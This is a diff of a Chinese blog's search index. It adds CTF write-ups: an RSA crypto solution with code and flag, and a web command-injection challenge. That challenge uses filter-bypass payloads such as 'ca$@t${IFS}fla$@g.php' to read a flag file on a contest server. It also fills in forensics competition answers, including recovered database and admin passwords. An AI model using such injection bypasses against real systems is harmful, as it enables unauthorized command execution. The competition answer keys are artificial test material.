@@ -1,6 +1,51 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Hackergame_EasyRSA</title>
+    <url>/2021/10/28/Hackergame-EasyRSA/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本来以为这是一道很简单的题，但是我太菜了犯了几个十分低级的错误（快哭了），感谢dbt给我指点迷津，膜拜大佬。</p>
+<h1 id="题目代码"><a href="#题目代码" class="headerlink" title="题目代码"></a>题目代码</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_p</span>():</span></span><br><span class="line">    x = <span class="number">11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451</span></span><br><span class="line">    y = <span class="number">11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439</span></span><br><span class="line">    value_p = sympy.nextprime((math.factorial(y)) % x)  <span class="comment"># Hint：这里直接计算会溢出，请你仔细观察 x 和 y 的特征</span></span><br><span class="line">    <span class="keyword">return</span> value_p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_q</span>():</span></span><br><span class="line">    value = [getPrime(<span class="number">256</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">        value.append(sympy.nextprime(value[i - <span class="number">1</span>]))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;value[-1] = &quot;</span>, value[-<span class="number">1</span>])</span><br><span class="line">    <span class="comment"># value[-1] = 80096058210213458444437404275177554701604739094679033012396452382975889905967</span></span><br><span class="line">    n = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        n = n * value[i]</span><br><span class="line">    q = getPrime(<span class="number">512</span>)</span><br><span class="line">    value_q = <span class="built_in">pow</span>(q, e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;value_q = &quot;</span>, value_q)</span><br><span class="line">    <span class="comment"># value_q = 5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819</span></span><br><span class="line">    <span class="keyword">return</span> sympy.nextprime(q)</span><br><span class="line"><span class="comment"># this destroyes the rsa cryptosystem</span></span><br><span class="line">p = get_p()</span><br><span class="line">q = get_q()</span><br><span class="line">m = <span class="built_in">int</span>.from_bytes(<span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read(), <span class="string">&quot;big&quot;</span>)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, p * q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = &quot;</span>, c)</span><br><span class="line"><span class="comment"># c = 110644875422336073350488613774418819991169603750711465190260581119043921549811353108399064284589038384540018965816137286856268590507418636799746759551009749004176545414118128330198437101472882906564195341277423007542422286760940374859966152871273887950174522820162832774361714668826122465471705166574184367478</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>对于这道题，在已知p和q的情况下其实不难，所以解题中心放在对p和q的求解上。</p>
+<h2 id="阶乘求模（威尔逊定理的应用）"><a href="#阶乘求模（威尔逊定理的应用）" class="headerlink" title="阶乘求模（威尔逊定理的应用）"></a>阶乘求模（威尔逊定理的应用）</h2><p>在对p的求取过程中，遇到了一个棘手的问题，就是y的阶乘模上x，其中x和y都是非常大的数，但是有一个比较重要的细节就是x-y=99012，不妨可以试着逆推求模，这里用到了一个定理</p>
+<blockquote>
+<p>威尔逊定理：当<strong>P</strong> 为质数的时候，**( P − 2 ) ! = 1(modp)**  即 <strong>(p−1)！≡−1(modp)</strong></p>
+</blockquote>
+<p><img src="/2021/10/28/Hackergame-EasyRSA/image-20211029003443721.png" alt="image-20211029003443721"></p>
+<p>我们可以想到将阶乘运算转化成余数的运算，由于y与x的大小十分接近，故可以从 <code>(x-1)! ≡ x-1 (modx)</code>往前逆推，</p>
+<p>由于 x-1可以写成-1，x-2可以写成-2，以此类推，我们所求的y！的余数即为<code>(-1)*(-2)*...*(-99011)</code>即为 -(99011)!。于是我们可以得到 <code>-99011 * K ≡ x-1 (modx)</code> 用拓展欧几里得定理很容易求出我们所需要的K。</p>
+<h2 id="对nextPrime的逆推"><a href="#对nextPrime的逆推" class="headerlink" title="对nextPrime的逆推"></a>对nextPrime的逆推</h2><p>已知一个素数L，求其及其前九个素数。本来我一开始的思路是定义一个num从1递增，一直循环到L-num用for循环十次nextPrime得到素数L停止，乍看感觉没什么问题，但是我忽视了所求到的     L-num并不能保证一定为素数，况且这样计算的时间复杂度很高，遇到很大的数时计算很麻烦。</p>
+<blockquote>
+<p>质数分布密度：素数分布越来越稀疏，但1e18内任意两个质数的差不会很大，好像有个人证明了不会超过246。</p>
+</blockquote>
+<p>DBT告诉我可以定义一个起始量L-10000（更精确具体的话可以设置为L-2460），在L-10000到L内肯定含有超过10个素数，只需要将其添加进列表中，只取后10个即可，想法比我的要好得多。</p>
+<h1 id="解题代码"><a href="#解题代码" class="headerlink" title="解题代码"></a>解题代码</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line">c = <span class="number">110644875422336073350488613774418819991169603750711465190260581119043921549811353108399064284589038384540018965816137286856268590507418636799746759551009749004176545414118128330198437101472882906564195341277423007542422286760940374859966152871273887950174522820162832774361714668826122465471705166574184367478</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="built_in">list</span> = []</span><br><span class="line">value_q = <span class="number">5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819</span></span><br><span class="line">a = <span class="number">80096058210213458444437404275177554701604739094679033012396452382975889905967</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(a-<span class="number">2460</span>,a+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> sympy.isprime(i):</span><br><span class="line">        <span class="built_in">list</span>.append(i)</span><br><span class="line">n_q = <span class="number">1</span></span><br><span class="line">phi_q = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    n_q = n_q * <span class="built_in">list</span>[-i]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>):</span><br><span class="line">    phi_q = phi_q * (<span class="built_in">list</span>[-i] - <span class="number">1</span>)</span><br><span class="line">q = <span class="built_in">pow</span>(value_q, gmpy2.invert(e, phi_q), n_q)</span><br><span class="line">q = sympy.nextprime(q)</span><br><span class="line">x = <span class="number">11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451</span></span><br><span class="line">y = <span class="number">11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439</span></span><br><span class="line">ooo = (-<span class="number">1</span> * math.factorial(<span class="number">99011</span>)) % x</span><br><span class="line">p = sympy.nextprime((gmpy2.invert(ooo, x) * (x-<span class="number">1</span>) ) % x)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, gmpy2.invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)), p*q)))</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="题目答案"><a href="#题目答案" class="headerlink" title="题目答案"></a>题目答案</h1><p>b’flag{CRYPT0_1s_Interesting!}’</p>
+]]></content>
+      <tags>
+        <tag>crypto</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>babeRCE</title>
+    <url>/2021/10/01/babeRCE/</url>
+    <content><![CDATA[<h2 id="babeRCE"><a href="#babeRCE" class="headerlink" title="babeRCE"></a>babeRCE</h2><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p><img src="/2021/10/01/babeRCE/image-20211001235119791.png" alt="image-20211001235119791"></p>
+<p>解题思路</p>
+<p>输入  47.93.215.154:5000/?rce=ls  可以得到   flag.php index.php</p>
+<p>目标就是实现指令cat flag.php 不过需要绕开指令检测</p>
+<p>在指令中穿插 \ 或 $@ 即可绕开， ${IFS} 可以代替空格</p>
+<p><code>http://47.93.215.154:5000/?rce=ca$@t$&#123;IFS&#125;fla$@g.php</code></p>
+<p><code>http://47.93.215.154:5000/?rce=ca\t$&#123;IFS&#125;fla\g.php</code></p>
+<p>其他的还有待补充</p>
+]]></content>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>2021长安杯做题总结</title>
     <url>/2021/10/26/2021%E9%95%BF%E5%AE%89%E6%9D%AF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>鼠鼠参加了长安杯，没想到连第七题的密码都没找出来，属实是太菜，哭哭了。硬生生的干坐了三个小时，最可笑的是做对的题竟然还没有蒙对的题多，想要技术过关，还需要继续学习！（WP暂时还不想写，最近的事比较多，期中考试，密码学习，美亚杯，各种各样的事情都需要去花时间去做，奈何时间不够又想要偷懒摸鱼，至少先一步一步来吧:（    ）</p>
@@ -133,9 +178,14 @@
 <p>第一个地方就是我在web3的时候发现默认网卡已经是enS33，就不需要像上面那样费力配置ENS160了，不过在配置完DHCP后，最好还是要在WEB3虚拟机上运行 <code>service network restart</code>，如果遇到连接不上的情况，建议重启web服务器</p>
 <p>第二个地方就是在个人电脑（不是PC虚拟机，我一开始理解错了）上运行Xshell时，要求输入虚拟机登陆密码，由于弘联火眼仿真已经将登陆密码修改成123456，所以输入honglian7001是无法登陆成功的（大佬请无视）</p>
 <p><img src="/2021/10/26/2021%E9%95%BF%E5%AE%89%E6%9D%AF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20211030193629364.png" alt="image-20211030193629364"></p>
+<p>在这个时候在Xshell中输入 <code>bt default</code>可以重置宝塔面板，同时也告诉了我们内网面板的网址，如果你的网络配置得当的话，在浏览器上输入 <code>192.168.110.113:8888/12345678</code>即可进入宝塔的登陆界面，不过此时发现使用给出的密码无法登录。</p>
+<p><img src="/2021/10/26/2021%E9%95%BF%E5%AE%89%E6%9D%AF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20211031140412111.png" alt="image-20211031140412111"></p>
+<p>我们在Xshell上输入 <code>bt</code>可以看到宝塔的操作面板，修改面板的密码，再在浏览器内登录，即可发现成功进去了</p>
+<p><img src="/2021/10/26/2021%E9%95%BF%E5%AE%89%E6%9D%AF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20211031141051329.png" alt="image-20211031141051329"></p>
+<p><img src="/2021/10/26/2021%E9%95%BF%E5%AE%89%E6%9D%AF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20211031141520064.png" alt="image-20211031141520064"></p>
 <p><strong>25、请分析用于重置宝塔面板密码的函数名为</strong></p>
 <p><strong>答案：set_panel_pwd</strong></p>
-<p>我们利用xtfp连接web服务器，在/www/server/panel目录下发现tools.py文件，对其进行分析</p>
+<p>我们利用xtfp连接web服务器，在/www/server/panel目录下发现tools.py文件，里面有我们在上面看到的面板命令行，对其进行分析</p>
 <p><img src="/2021/10/26/2021%E9%95%BF%E5%AE%89%E6%9D%AF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20211030231224689.png" alt="image-20211030231224689"></p>
 <p>这里是宝塔面板，可以看到当输入为5时修改宝塔面板密码</p>
 <p><img src="/2021/10/26/2021%E9%95%BF%E5%AE%89%E6%9D%AF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20211030231341859.png" alt="image-20211030231341859"></p>
@@ -155,25 +205,56 @@
 <p><img src="/2021/10/26/2021%E9%95%BF%E5%AE%89%E6%9D%AF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20211030233952229.png" alt="image-20211030233952229"></p>
 <p>找到default.db文件，打开在user中发现salt一栏</p>
 <p><strong>29、请分析该服务器，网站源代码所在的绝对路径为</strong></p>
-<p><strong>答案：</strong></p>
-<p><strong>30、请分析，网站所使用的数据库位于IP为（）的服务器上（请使用该IP解压检材4，并重构网 站）</strong></p>
-<p><strong>答案：</strong></p>
+<p><strong>答案：/www/wwwroot/<a href="http://www.honglian7001/">www.honglian7001</a></strong></p>
+<p>用浏览器登录宝塔页面，进去后可以看到网站的根目录</p>
+<p><img src="/2021/10/26/2021%E9%95%BF%E5%AE%89%E6%9D%AF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20211031142035205.png" alt="image-20211031142035205"></p>
+<p><strong>30、请分析，网站所使用的数据库位于IP为（）的服务器上（请使用该IP解压检材5，并重构网站）<em>这里是检材5，题目标错了</em></strong></p>
+<p><strong>答案：192.168.110.115</strong></p>
+<p>我们解压检材5后，发现了三个RAID块，告诉我们需要进行RAID重组</p>
+<p><img src="/2021/10/26/2021%E9%95%BF%E5%AE%89%E6%9D%AF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20211031142540279.png" alt="image-20211031142540279"></p>
+<p>我们使用 R-studio 工具，对其进行扫描判断磁盘阵列</p>
+<p><img src="/2021/10/26/2021%E9%95%BF%E5%AE%89%E6%9D%AF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/e7lsETtH53fnwbv.png" alt="e7lsETtH53fnwbv"></p>
+<p>添加完成后对其进行扫描，检测结束后会告诉我们可能的重组方式</p>
+<p><img src="/2021/10/26/2021%E9%95%BF%E5%AE%89%E6%9D%AF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/wb2NvnKrVjPOulQ.png" alt="wb2NvnKrVjPOulQ"></p>
+<p>我们可以看到可能性最高的就是 <strong>123 RAID5 左同步</strong>，数据块大小为 <strong>64k</strong>，接下来我们打开取证大师，按照这个配置导入raid</p>
+<p><img src="/2021/10/26/2021%E9%95%BF%E5%AE%89%E6%9D%AF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20211031144757334.png" alt="image-20211031144757334"></p>
+<p>分析结束后再将其重组好的制作成一个新的镜像文件并导出(是对重组好的RAID制作镜像，而不是对动态磁盘root制作)</p>
+<p><img src="/2021/10/26/2021%E9%95%BF%E5%AE%89%E6%9D%AF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20211031151128881.png" alt="image-20211031151128881"></p>
+<p>这样我们就得到了一个可以用来进行仿真的服务器镜像，打开后可以得知数据库的IP地址</p>
+<p><img src="/2021/10/26/2021%E9%95%BF%E5%AE%89%E6%9D%AF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20211031151506416.png" alt="image-20211031151506416"></p>
 <p><strong>31、请分析，数据库的登陆密码为【区分大小写】</strong></p>
-<p><strong>答案：</strong></p>
+<p><strong>答案：wxrM5GtNXk5k5EPX</strong></p>
+<p>我们继续从web3服务器上查看源码，在 <code>/www/wwwroot/[www.honglian7001/app/database.php</code> 中我们可以看到网站的数据库配置</p>
+<p><img src="/2021/10/26/2021%E9%95%BF%E5%AE%89%E6%9D%AF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20211031152919223.png" alt="image-20211031152919223"></p>
 <p><strong>32、请尝试重构该网站，并指出，该网站的后台管理界面的入口为【标准格式：/web】</strong></p>
-<p><strong>答案：</strong></p>
+<p><strong>答案：/admin</strong></p>
+<p>从目录结构可以看到<code>/www/wwwroot/www.honglian7001/app/admin</code>……所以比较容易猜测<code>admin</code>，或者我们在PC检材查看历史纪录时就已经发现网站的后台管理界面，</p>
+<p><img src="/2021/10/26/2021%E9%95%BF%E5%AE%89%E6%9D%AF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20211031153549048.png" alt="image-20211031153549048"></p>
 <p><strong>33、已该涉案网站代码中对登录用户的密码做了加密处理。请找出加密算法中的salt值【区分大 小写】</strong></p>
-<p><strong>答案：</strong></p>
+<p><strong>答案：lshi4AsSUrUOwWV</strong></p>
+<p>在网站根目录admin中有个common.php打开可以看到加的盐值</p>
+<p><img src="/2021/10/26/2021%E9%95%BF%E5%AE%89%E6%9D%AF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20211031154450364.png" alt="image-20211031154450364"></p>
 <p><strong>34、请分析该网站的管理员用户的密码为：</strong></p>
-<p><strong>答案：</strong></p>
+<p><strong>答案：security</strong></p>
+<p>我们能在web服务器中找到面板运行时的日志</p>
+<p><img src="/2021/10/26/2021%E9%95%BF%E5%AE%89%E6%9D%AF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20211031160633674.png" alt="image-20211031160633674"></p>
+<p>对应案发时间的文件夹内只有两个日志文件，我们打开使用搜索passwd或password后可以看到用户名都是admin，而一个密码是 123456 ，另一个密码是  security ，试一试就可以了</p>
+<p><img src="/2021/10/26/2021%E9%95%BF%E5%AE%89%E6%9D%AF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20211031161214113.png" alt="image-20211031161214113"></p>
+<p>验证码要注意区分大小写，成功进入系统</p>
+<p><img src="/2021/10/26/2021%E9%95%BF%E5%AE%89%E6%9D%AF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20211031161248154.png" alt="image-20211031161248154"></p>
 <p><strong>35、在对后台账号的密码加密处理过程中，后台一共计算几次哈希值</strong></p>
-<p><strong>答案：</strong></p>
+<p><strong>答案：3</strong></p>
+<p><img src="/2021/10/26/2021%E9%95%BF%E5%AE%89%E6%9D%AF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20211031162025691.png" alt="image-20211031162025691"></p>
 <p><strong>36、请统计，后台中，一共有多少条设备记录</strong></p>
-<p><strong>答案:</strong></p>
+<p><strong>答案：6002</strong></p>
 <p><strong>37、请通过后台确认，本案中受害者的手机号码为</strong></p>
-<p><strong>答案：</strong></p>
+<p><strong>答案：18644099137</strong></p>
+<p>为什么这么确定是这张图片呢，是因为在骗子要挟金先生的时候，曾经向金先生炫耀过他的通讯录，里面最显眼的就是第一条女朋友！！，还有这张图片也能确定通讯录</p>
+<p><img src="/2021/10/26/2021%E9%95%BF%E5%AE%89%E6%9D%AF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20211031162701381.png" alt="image-20211031162701381"></p>
+<p><img src="/2021/10/26/2021%E9%95%BF%E5%AE%89%E6%9D%AF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20211031161816009.png" alt="image-20211031161816009"></p>
 <p><strong>38、请分析，本案中受害者的通讯录一共有多少条记录</strong></p>
-<p><strong>答案：</strong></p>
+<p><strong>答案：34</strong></p>
+<p><img src="/2021/10/26/2021%E9%95%BF%E5%AE%89%E6%9D%AF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20211031161941393.png" alt="image-20211031161941393"></p>
 <h2 id="检材四、五"><a href="#检材四、五" class="headerlink" title="检材四、五"></a>检材四、五</h2><blockquote>
 <p>通过对检材二和三进行分析，警方通过IP落地，警方掌成功抓获犯罪嫌疑人，现将嫌疑人的PC机和手机进行了取证，分别制 作了镜像，请使用第13题的答案对检材四进行解密，并回答下列问题</p>
 </blockquote>
@@ -210,49 +291,61 @@
 <p><strong>答案：1649840939</strong></p>
 <p><img src="/2021/10/26/2021%E9%95%BF%E5%AE%89%E6%9D%AF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20211030182635997.png" alt="image-20211030182635997"></p>
 <p><strong>49、请综合分析，嫌疑人用于管理敲诈对象的容器文件的SHA256值为</strong></p>
-<p><strong>答案：</strong></p>
+<p><strong>答案：9C48E29EB5661E6ED088A364ECCóEF004C150618088D7000A393340180F15608</strong></p>
+<p>我们导出并解压 <code>我的赚钱工具.zip</code>，得到一个虚拟机镜像，我们用仿真打开（选择那个不带后缀0002的镜像），会找到一个叫 <code>我的小白鼠</code>  的文件，密钥文件为key，之后用beracrypt进行解密</p>
+<p><img src="/2021/10/26/2021%E9%95%BF%E5%AE%89%E6%9D%AF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20211031171144395.png" alt="image-20211031171144395"></p>
+<blockquote>
+<p>转自BB：</p>
+<p>但，，，当我看了复盘以后我才发现……这个犯罪嫌疑人就<code>TM</code>是天才，每次干完坏事，直接打个快照然后把东西全删了，这<code>nm</code>是我玩玩没有想到的……绝了！</p>
+<p>然后我又尝试着直接打开虚拟机，发现依据<code>vmdk</code>直接仿真的和直接打开虚拟机有很大差别，而差别就是快照！（这里请教了一下<code>konge</code>师傅，当你给虚拟机打一个快照的时候，他会生成一个<code>*-0000001.vmdk</code>文件，这个虚拟硬盘文件就是打快照时<code>*.vmdk</code>的一个分支。所以<code>*.vmdk</code>就是全部的文件，也就是没有打快照前的文件，而<code>*-0000001.vmdk</code>里面就是新储存的文件或者删除的文件信息。）</p>
+<p>咳咳……</p>
+<p>现在相当于是恢复了相关的证据文件，但是<code>小白鼠.txt</code>是个加密容器还没有解密，我们在取证大师的加密文件中看到了一个<code>key.rar</code>我们合理怀疑这个就是密钥文件（但是比赛的时候我一个劲想着把<code>key.rar</code>解开，以为里面的图片才是密钥文件…… ）</p>
+</blockquote>
+<p><img src="/2021/10/26/2021%E9%95%BF%E5%AE%89%E6%9D%AF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20211031181102775.png" alt="image-20211031181102775"></p>
+<p>第一遍找的时候没有找到，可能是因为我没有先检验该文件的SHA256值就直接用VC进行解密加载了，应该是解密的过程改变了文件，在弘联火眼里删掉该虚拟机（别删掉虚拟机镜像文件），之后重新操作一遍就好了</p>
+<p>BB的意思大概是需要将虚拟机镜像和快照进行对比，判断出文件的操作记录，比如这里嫌疑人在快照中直接将系统重置了，我打开的时候里面什么东西也没有，但是由于VM虚拟机默认打开的是快照文件，所以还是建议通过弘联火眼进行仿真再打开（反正直接你也不知道开机密码）</p>
 <p><strong>50、请综合分析嫌疑人检材，另外一受害者“郭先生”的手机号码为</strong></p>
-<p><strong>答案：</strong></p>
+<p><strong>答案：15266668888</strong></p>
+<p>打开郭先生文件夹，发现了设备手机号</p>
+<p><img src="/2021/10/26/2021%E9%95%BF%E5%AE%89%E6%9D%AF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20211031173308144.png" alt="image-20211031173308144"></p>
+<p>同样在这里也可以找到金先生的手机号</p>
+<p><img src="/2021/10/26/2021%E9%95%BF%E5%AE%89%E6%9D%AF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20211031173357885.png" alt="image-20211031173357885"></p>
 <p><strong>51、通过嫌疑人检材，其中记录了几位受害者的信息</strong></p>
-<p><strong>答案：</strong></p>
+<p><strong>答案：5</strong></p>
+<p>查看文件夹，共发现五位受害者</p>
+<p><img src="/2021/10/26/2021%E9%95%BF%E5%AE%89%E6%9D%AF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20211031173412810.png" alt="image-20211031173412810"></p>
 <p><strong>52、请使用第11题的密码解压“金先生转账.zip”文件，并对压缩包中的文件计算SHA256值</strong></p>
-<p><strong>答案：</strong></p>
+<p><strong>答案：cd62a83690a53e5b441838bc55ab83be92ff5ed26ec646d43911f119c15df510</strong></p>
+<p>解压后即可得到SHA256值</p>
+<p><img src="/2021/10/26/2021%E9%95%BF%E5%AE%89%E6%9D%AF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/image-20211031173638457.png" alt="image-20211031173638457"></p>
 <p><strong>53、请综合分析，受害者一共被嫌疑人敲诈了多少钱（转账截图被隐藏在多个地方）</strong></p>
-<p><strong>答案：</strong></p>
-<h1 id="疑难杂症"><a href="#疑难杂症" class="headerlink" title="疑难杂症"></a>疑难杂症</h1><p><strong>14、请对检材二进行分析，并回答该服务器在集群中承担的主要作用是（）</strong></p>
-<p><strong>23、请分析第21题中，所指的服务器的开机密码为：</strong></p>
+<p><strong>答案：6600</strong></p>
+<blockquote>
+<p>下面的内容引用自BB的博客</p>
+</blockquote>
+<p>这个说实话，，，有点难搞：</p>
+<p><img src="http://blog.blackbird.wang/images/changancup3/image-20211030180910494.png" alt="image-20211030180910494"></p>
+<p><img src="http://blog.blackbird.wang/images/changancup3/image-20211030180933711.png" alt="image-20211030180933711"></p>
+<p><img src="http://blog.blackbird.wang/images/changancup3/image-20211030181008891.png" alt="image-20211030181008891"></p>
+<p>然后PC端里面的压缩包的图片：</p>
+<p><img src="http://blog.blackbird.wang/images/changancup3/image-20211030181336911.png" alt="image-20211030181336911"></p>
+<p>然后就错了……</p>
+<p>还有一笔在数据库里，，，这个鬼能想到啊。</p>
+<p>然后很自然的想到，分析，导出数据库，查看那个图片。但是，问题来了，虚拟机里面的数据库是个<code>server</code>，并不是文件。所以我们得直接通过服务进行连接。但是不管是什么工具或者是在它服务器上面都连不上数据库。这块是看了复盘才知道，数据库有个<a href="https://blog.csdn.net/zbszhangbosen/article/details/7434154">”空用户问题“</a>，我们你需要先修一下这个。</p>
+<p>然后这里请教了一下<code>Frank</code>。这里的空用户问题根源是用户的一个匹配问题，说直白些就是，你以为连接数据库时你用的是A用户，A用户是有密码的，你也传了一个密码进去；但是你却匹配到了B用户，而B用户却没有密码，所以就发生了冲突，就登录不上了。而匹配时会在<code>user</code>表里面查找匹配：</p>
+<p><img src="http://blog.blackbird.wang/images/changancup3/image-20211030195116381.png" alt="image-20211030195116381"></p>
+<p>解决方法：</p>
+<ol>
+<li>去掉密码验证，这样的话都没有密码了，也就没有冲突了。</li>
+<li>删除掉可能会导致匹配错误的用户（但是你还是得先去掉密码登陆进去……）</li>
+<li>看<code>mysql</code>源码，查看他的匹配优先排序的算法（<a href="https://dev.mysql.com/doc/refman/5.7/en/connection-access.html%EF%BC%89%EF%BC%8C%E4%BD%86%E6%98%AF%E8%B2%8C%E4%BC%BC%E8%BF%99%E4%B8%AA%E6%96%87%E6%A1%A3%E9%87%8C%E9%9D%A2%E8%AF%B4%E7%9A%84%E4%B9%9F%E4%B8%8D%E6%98%AF%E5%BE%88%E6%B8%85%E6%99%B0%EF%BC%8C%E5%8F%AA%E6%9C%89%E4%B8%80%E5%8F%A5%E2%80%9D%E8%B6%8A%E7%B2%BE%E7%A1%AE%E8%B6%8A%E4%BC%98%E5%85%88%E2%80%9C%E2%80%A6%E2%80%A6%EF%BC%88%E5%8A%A0%E6%B2%B9[doge]">https://dev.mysql.com/doc/refman/5.7/en/connection-access.html），但是貌似这个文档里面说的也不是很清晰，只有一句”越精确越优先“……（加油[doge]</a></li>
+</ol>
+<p>最后终于看到数据库了，，，泪目：</p>
+<p><img src="http://blog.blackbird.wang/images/changancup3/image-20211030195814328.png" alt="image-20211030195814328"></p>
+<h1 id="完结撒花（好耶）"><a href="#完结撒花（好耶）" class="headerlink" title="完结撒花（好耶）"></a>完结撒花（好耶）</h1><p>花了将近一个周末的时间，只能说效率太低了，或者说由于掌握的东西太少了，导致学习新东西及如何使用的时间占用了太多太多，不过也可以说收获很多。该腾点时间给期中考试（哭哭了，要挂科了），下面将会转战美亚杯2020的团体赛题目（个人赛大概走了一遍，感觉没什么带坑的地方，也不会转弯抹角的采用各种解压密码套路你（doge），继续加油把，冲冲冲）</p>
 ]]></content>
       <tags>
         <tag>电子数据取证</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hackergame_EasyRSA</title>
-    <url>/2021/10/28/Hackergame-EasyRSA/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本来以为这是一道很简单的题，但是我太菜了犯了几个十分低级的错误（快哭了），感谢dbt给我指点迷津，膜拜大佬。</p>
